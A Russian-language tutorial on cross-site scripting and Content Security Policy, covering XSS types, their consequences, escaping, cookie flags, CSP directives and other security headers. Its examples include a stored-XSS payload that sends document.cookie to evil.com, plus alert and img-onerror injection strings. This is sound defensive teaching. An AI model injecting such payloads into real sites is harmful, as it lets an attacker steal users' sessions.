# XSS (Cross-Site Scripting) атаки и CSP

## Определения

**XSS (Cross-Site Scripting)** — это тип атаки на веб-приложения, при котором злоумышленник внедряет вредоносный JavaScript-код в веб-страницы, просматриваемые другими пользователями. Название образовалось от сокращения CSS (Cascading Style Sheets), чтобы избежать путаницы со стилями.

**CSP (Content Security Policy)** — это механизм безопасности, который позволяет веб-серверам контролировать ресурсы (скрипты, стили, изображения), которые браузер может загружать и выполнять на странице. Реализуется через HTTP-заголовок `Content-Security-Policy`.

## Типы XSS атак

### 1. Stored XSS (Хранимый/Постоянный)

Вредоносный скрипт сохраняется на сервере (в базе данных, комментариях, профилях) и выполняется при просмотре зараженной страницы.

**Пример:**
```html
<!-- Злоумышленник оставляет комментарий: -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

<!-- Скрипт сохраняется в БД и выполняется у всех посетителей -->
```

### 2. Reflected XSS (Отраженный/Непостоянный)

Вредоносный код передается в HTTP-запросе (URL-параметры, формы) и немедленно отображается в ответе сервера без сохранения.

**Пример:**
```html
<!-- Уязвимый URL: https://example.com/search?q=<script>alert('XSS')</script> -->
<!-- Сервер отражает параметр q в HTML без экранирования -->
```

### 3. DOM-based XSS

Атака происходит полностью на стороне клиента при обработке данных JavaScript-кодом (через `innerHTML`, `document.write`, `eval`).

**Пример:**
```javascript
// Уязвимый код
var hash = location.hash.slice(1);
element.innerHTML = hash; // Вставка без санитизации

// Атака: https://example.com/page#<img src=x onerror=alert('XSS')>
```

## Последствия XSS атак

- Кража сессионных cookies и токенов аутентификации
- Подмена содержимого страницы (defacing)
- Перенаправление пользователей на фишинговые сайты
- Выполнение действий от имени пользователя (CSRF через XSS)
- Кража конфиденциальных данных со страницы
- Майнинг криптовалюты в браузере пользователя
- Заражение компьютера через эксплойты браузера

## Защита от XSS

### 1. Экранирование вывода (Output Encoding)

Всегда экранируйте данные при выводе в HTML, JavaScript, CSS, URL.

**Примеры экранирования:**
```html
<!-- HTML контекст -->
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- JavaScript контекст -->
\x3cscript\x3ealert('XSS')\x3c/script\x3e

<!-- URL контекст -->
%3Cscript%3Ealert('XSS')%3C/script%3E
```

### 2. Валидация входных данных

```python
# Проверка типа и формата
if not user_id.isdigit():
    raise ValueError("ID должен быть числом")

# Белый список допустимых значений
allowed_tags = ['p', 'br', 'strong', 'em']
```

### 3. Использование современных фреймворков

React, Vue, Angular автоматически экранируют вывод по умолчанию.

```jsx
// React автоматически экранирует
function Component({ userInput }) {
  return <div>{userInput}</div>; // Безопасно
}

// Опасно! Используется только при необходимости
function Dangerous({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

### 4. HttpOnly и Secure флаги для Cookies

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
```

- **HttpOnly:** Запрещает JavaScript доступ к cookie через `document.cookie`
- **Secure:** Отправлять cookie только по HTTPS
- **SameSite:** Защита от CSRF-атак

## Content Security Policy (CSP)

### Базовые директивы

```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.googleapis.com;
  object-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self'
```

### Ключевые директивы

| Директива | Описание |
|-----------|----------|
| `default-src` | Значение по умолчанию для всех директив |
| `script-src` | Источники JavaScript |
| `style-src` | Источники CSS |
| `img-src` | Источники изображений |
| `connect-src` | Разрешенные endpoints для XHR, WebSocket, EventSource |
| `font-src` | Источники шрифтов |
| `object-src` | Источники для плагинов (Flash, Java) |
| `frame-src` | Разрешенные iframe источники |
| `frame-ancestors` | Кто может встраивать страницу во фрейм (защита от clickjacking) |
| `base-uri` | Разрешенные значения для `<base>` |
| `form-action` | Куда могут отправляться формы |

### Специальные значения

- `'self'` — разрешить с того же источника
- `'none'` — запретить полностью
- `'unsafe-inline'` — разрешить inline-скрипты/стили (небезопасно)
- `'unsafe-eval'` — разрешить `eval()`, `setTimeout(string)` (небезопасно)
- `'nonce-<value>'` — разрешить скрипты с определенным nonce
- `'sha256-<hash>'` — разрешить скрипты с определенным хешем

### Режим Report-Only

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

Политика не блокирует ресурсы, но отправляет отчеты о нарушениях. Используется для тестирования перед включением политики.

### Nonce-based CSP

Генерация случайного nonce для каждого запроса:

```html
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'nonce-abc123';">

<script nonce="abc123">
  // Этот скрипт разрешен
  console.log('Hello');
</script>
```

## Практические сценарии

### 1. Миграция на строгую CSP

1. Начните с `Content-Security-Policy-Report-Only`
2. Анализируйте отчеты и исправляйте нарушения
3. Перемещайте inline-скрипты во внешние файлы
4. Для необходимых inline-скриптов используйте nonce или hash
5. После стабилизации включите политику

### 2. Защита legacy-приложений

```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  style-src 'self' 'unsafe-inline';
  upgrade-insecure-requests
```

Более мягкая политика для старых приложений с постепенным ужесточением.

### 3. Проверка CSP

Инструменты для анализа:
- CSP Evaluator (Google)
- CSP Generator
- Браузерные DevTools → Security

## Дополнительные HTTP-заголовки безопасности

```http
# Защита от XSS (устаревший, но все еще полезный)
X-XSS-Protection: 1; mode=block

# Защита от clickjacking
X-Frame-Options: DENY

# Предотвращение MIME-sniffing
X-Content-Type-Options: nosniff

# HTTPS строго
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Контроль реферера
Referrer-Policy: strict-origin-when-cross-origin

# Разрешения для браузерных API
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

## Резюме

XSS остается одной из самых распространенных уязвимостей веб-приложений. Комплексная защита включает:

1. **На уровне кода:** Экранирование вывода, валидация ввода
2. **На уровне архитектуры:** CSP, HttpOnly cookies
3. **На уровне инфраструктуры:** WAF для фильтрации входящего трафика
4. **На уровне процессов:** Регулярное сканирование (SAST/DAST), code review
